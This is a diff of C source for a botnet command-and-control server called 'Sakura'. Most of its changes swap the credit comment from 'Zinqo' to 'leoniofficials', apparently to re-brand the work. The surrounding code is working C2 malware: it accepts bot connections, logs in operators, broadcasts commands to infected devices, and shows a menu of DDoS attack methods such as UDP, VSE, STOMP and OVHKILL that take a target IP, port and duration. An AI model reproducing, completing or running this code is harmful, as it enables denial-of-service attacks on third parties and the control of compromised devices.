@@ -15,7 +15,7 @@
 #include <errno.h>
 #include <pthread.h>
 #define MAXFDS 1000000
-//Made By Zinqo.
+//Made By leoniofficials.
 struct clientdata_t {
         uint32_t ip;
         char connected;
@@ -102,7 +102,7 @@ static int create_and_bind (char *port) {
 void *BotEventLoop(void *useless) {
 	struct epoll_event event;
 	struct epoll_event *events;
-	int s;//Made By Zinqo.
+	int s;//Made By leoniofficials.
     events = calloc (MAXFDS, sizeof event);
     while (1) {
 		int n, i;
@@ -122,7 +122,7 @@ void *BotEventLoop(void *useless) {
                 in_len = sizeof in_addr;
                 infd = accept (listenFD, &in_addr, &in_len);
 				if (infd == -1) {
-					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;//Made By Zinqo.
+					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;//Made By leoniofficials.
                     else {
 						perror ("accept");
 						break;
@@ -144,7 +144,7 @@ void *BotEventLoop(void *useless) {
 				}
 				s = make_socket_non_blocking (infd);
 				if (s == -1) { close(infd); break; }
-				event.data.fd = infd;//Made By Zinqo.
+				event.data.fd = infd;//Made By leoniofficials.
 				event.events = EPOLLIN | EPOLLET;
 				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
 				if (s == -1) {
@@ -167,7 +167,7 @@ void *BotEventLoop(void *useless) {
 				memset(buf, 0, sizeof buf);
 				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
 					if(strstr(buf, "\n") == NULL) { done = 1; break; }
-					trim(buf);//Made By Zinqo.
+					trim(buf);//Made By leoniofficials.
 					if(strcmp(buf, "PING") == 0) {
 						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
 						continue;
@@ -270,7 +270,7 @@ int Find_Login(char *str) {
         fclose(fp);
     if(find_result == 0)return 0;
     return find_line;
-}//Made By Zinqo.
+}//Made By leoniofficials.
 
 void *BotWorker(void *sock) {
 	int datafd = (int)sock;
@@ -313,7 +313,7 @@ void *BotWorker(void *sock) {
         trim(buf);
 		char* nickstring;
 		sprintf(accounts[find_line].username, buf);
-        nickstring = ("%s", buf);//Made By Zinqo.
+        nickstring = ("%s", buf);//Made By leoniofficials.
         find_line = Find_Login(nickstring);
         if(strcmp(nickstring, accounts[find_line].username) == 0){
 		char password [5000];
@@ -322,7 +322,7 @@ void *BotWorker(void *sock) {
 
         if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
 
-        trim(buf);//Made By Zinqo.
+        trim(buf);//Made By leoniofficials.
         if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
         memset(buf, 0, 2048);
 		
@@ -336,7 +336,7 @@ void *TitleWriter(void *sock) {
         sprintf(string, "%c]0;Sakura | Devices Connected: %d | Users Online: %d | User: %s %c", '\033', BotsConnected(), OperatorsConnected, accounts[find_line].username, '\007');
         if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 		sleep(2);
-		}//Made By Zinqo.
+		}//Made By leoniofficials.
 }		
         failed:
 		if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
@@ -384,7 +384,7 @@ void *TitleWriter(void *sock) {
 				char help6  [800];
 				char help7  [800];
 				char help8  [800];
-//Made By Zinqo.
+//Made By leoniofficials.
         		sprintf(help1, "\e[1;95m╔═══════════════════════════════════════╗\e[0m\r\n");
         		sprintf(help2, "\e[1;95m║\e[0m \e[1;95mATTACK\e[0m - Shows Attack Commands.       \e[1;95m║\e[0m\r\n");
         		sprintf(help3, "\e[1;95m║\e[0m \e[1;95mSTATS\e[0m - Shows Server Stats.           \e[1;95m║\e[0m\r\n");
@@ -420,7 +420,7 @@ void *TitleWriter(void *sock) {
 				char info6  [800];
 
             	sprintf(info1, "\e[1;95m╔═════════════════════════════════════════════════════════════════╗\e[0m\r\n");
-            	sprintf(info2, "\e[1;95m║\e[0m This Source Was Made By Me... My Name Is Zinqo AKA Big Daddy.   \e[1;95m║\e[0m\r\n");
+            	sprintf(info2, "\e[1;95m║\e[0m This Source Was Made By Me... My Name Is leoniofficials AKA Big Daddy.   \e[1;95m║\e[0m\r\n");
             	sprintf(info3, "\e[1;95m║\e[0m I Did Not Make Any Of The Methods In This Source.               \e[1;95m║\e[0m\r\n");
             	sprintf(info4, "\e[1;95m║\e[0m I Am Not In Charge With Any DDOS Attacks Sent With This Source. \e[1;95m║\e[0m\r\n");
             	sprintf(info5, "\e[1;95m║\e[0m I Finished This Source On September 16th, 2020.                 \e[1;95m║\e[0m\r\n");
@@ -433,7 +433,7 @@ void *TitleWriter(void *sock) {
 				if(send(datafd, info5,  strlen(info5), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, info6,  strlen(info6), MSG_NOSIGNAL) == -1) goto end;
 
-				pthread_create(&title, NULL, &TitleWriter, sock);//Made By Zinqo.
+				pthread_create(&title, NULL, &TitleWriter, sock);
 		char input [5000];
         sprintf(input, "\e[0m[\e[1;95mSakura\e[0m]~: \e[0m");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
@@ -470,7 +470,7 @@ void *TitleWriter(void *sock) {
         sprintf(input, "\e[0m[\e[1;95mSakura\e[0m]~: \e[0m");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				continue;
-			}//Made By Zinqo.
+			}
 				if(strstr(buf, "ATTACK")) {
 				pthread_create(&title, NULL, &TitleWriter, sock);
 				char attack1  [800];
@@ -486,7 +486,7 @@ void *TitleWriter(void *sock) {
 				char attackb  [800];
 				char attackc  [800];
 				char attackd  [800];
-//Made By Zinqo.
+
         		sprintf(attack1,  "\e[1;95m╔════════════════════════════════════════════════════╗\e[0m\r\n");
         		sprintf(attack2,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mUDP\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m] \e[1;95m32\e[0m \e[1;95m0\e[0m \e[1;95m10\e[0m                   \e[1;95m║\e[0m\r\n");
         		sprintf(attack3,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mTCP\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m] \e[1;95m32\e[0m [\e[1;95mFLAGS\e[0m(\e[1;95mALL\e[0m)] \e[1;95m0\e[0m \e[1;95m10\e[0m      \e[1;95m║\e[0m\r\n");
@@ -494,7 +494,7 @@ void *TitleWriter(void *sock) {
         		sprintf(attack5,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mSTDHEX\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m]                        \e[1;95m║\e[0m\r\n");
         		sprintf(attack6,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mVSE\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m] \e[1;95m32\e[0m \e[1;95m1024\e[0m \e[1;95m10\e[0m                \e[1;95m║\e[0m\r\n");
         		sprintf(attack7,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mXMAS\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m]                          \e[1;95m║\e[0m\r\n");
-        		sprintf(attack8,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mCRUSH\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m] \e[1;95m32\e[0m [\e[1;95mFLAGS\e[0m(\e[1;95mALL\e[0m)] \e[1;95m10\e[0m \e[1;95m1024\e[0m \e[1;95m║\e[0m\r\n");//Made By Zinqo.
+        		sprintf(attack8,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mCRUSH\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m] \e[1;95m32\e[0m [\e[1;95mFLAGS\e[0m(\e[1;95mALL\e[0m)] \e[1;95m10\e[0m \e[1;95m1024\e[0m \e[1;95m║\e[0m\r\n");//Made By .
         		sprintf(attack9,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mSTOMP\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m] \e[1;95m32\e[0m [\e[1;95mFLAGS\e[0m(\e[1;95mALL\e[0m)] \e[1;95m10\e[0m \e[1;95m1024\e[0m \e[1;95m║\e[0m\r\n");
         		sprintf(attacka,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mNFODROP\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m]                       \e[1;95m║\e[0m\r\n");
         		sprintf(attackb,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mOVHKILL\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m]                       \e[1;95m║\e[0m\r\n");
@@ -525,7 +525,7 @@ void *TitleWriter(void *sock) {
 			if(strstr(buf, "STATS")) {
 				char devicecount [2048];
 				memset(devicecount, 0, 2048);
-				char onlineusers [2048];//Made By Zinqo.
+				char onlineusers [2048];//Made By leoniofficials.
 				char userconnected [2048];
 				sprintf(devicecount, "\e[0mDevices Connected: %d\e[0m\r\n", BotsConnected());		
 				sprintf(onlineusers, "\e[0mUsers Online: %d\e[0m\r\n", OperatorsConnected);
@@ -553,7 +553,7 @@ void *TitleWriter(void *sock) {
 
 
 				while(1) {
-		char input [5000];//Made By Zinqo.
+		char input [5000];//Made By leoniofficials.
         sprintf(input, "\e[0m[\e[1;95mSakura\e[0m]~: \e[0m");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				break;
@@ -613,7 +613,7 @@ void *TitleWriter(void *sock) {
         {
         sprintf(sentattacks, "\e[0mAttack Has Been Sent.\e[0m\r\n");
         if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
-        }//Made By Zinqo.
+        }//Made By leoniofficials.
         if(strstr(buf, "! STOP")) 
         {
         sprintf(sentattacks, "\e[0mAttack Has Been Stopped.\e[0m\r\n");
@@ -628,7 +628,7 @@ void *TitleWriter(void *sock) {
 
 			FILE *logfile;
             logfile = fopen("Sakura_Logs.log", "a");
-//Made By Zinqo.
+//Made By leoniofficials.
             fprintf(logfile, "User: %s | Command: %s\n", accounts[find_line].username, buf);
             fclose(logfile);
             broadcast(buf, datafd, accounts[find_line].username);
@@ -661,7 +661,7 @@ void *BotListener(int port) {
 }}
 int main (int argc, char *argv[], void *sock) {
 	    printf("\e[1;95mSakura\e[0m\n");
-        signal(SIGPIPE, SIG_IGN);//Made By Zinqo.
+        signal(SIGPIPE, SIG_IGN);//Made By leoniofficials.
         int s, threads, port;
         struct epoll_event event;
         if (argc != 4) {
@@ -685,7 +685,7 @@ int main (int argc, char *argv[], void *sock) {
         if (epollFD == -1) {
 			perror ("epoll_create");
 			abort ();
-        }//Made By Zinqo.
+        }//Made By leoniofficials.
         event.data.fd = listenFD;
         event.events = EPOLLIN | EPOLLET;
         s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
@@ -700,8 +700,9 @@ int main (int argc, char *argv[], void *sock) {
         pthread_create(&thread[0], NULL, &BotListener, port);
         while(1) {
 			broadcast("PING", -1, "Sakura");
-			sleep(60);//Made By Zinqo.
+			sleep(60);//Made By leoniofficials.
         }
         close (listenFD);
         return EXIT_SUCCESS;
 }
+
